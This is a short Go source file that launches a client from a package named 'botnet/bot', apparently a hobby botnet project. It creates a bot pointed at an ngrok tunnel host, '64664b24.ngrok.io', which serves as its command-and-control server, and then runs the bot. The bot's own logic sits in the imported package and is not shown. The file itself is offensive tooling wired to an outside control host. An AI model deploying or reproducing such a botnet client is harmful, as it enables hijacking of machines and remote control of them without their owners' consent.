package main

import (
	"log"

	"github.com/adrianosela/botnet/bot"
)

func main() {
	b, err := bot.NewBot("64664b24.ngrok.io")
	if err != nil {
		log.Fatal(err)
	}
	b.Run()
}
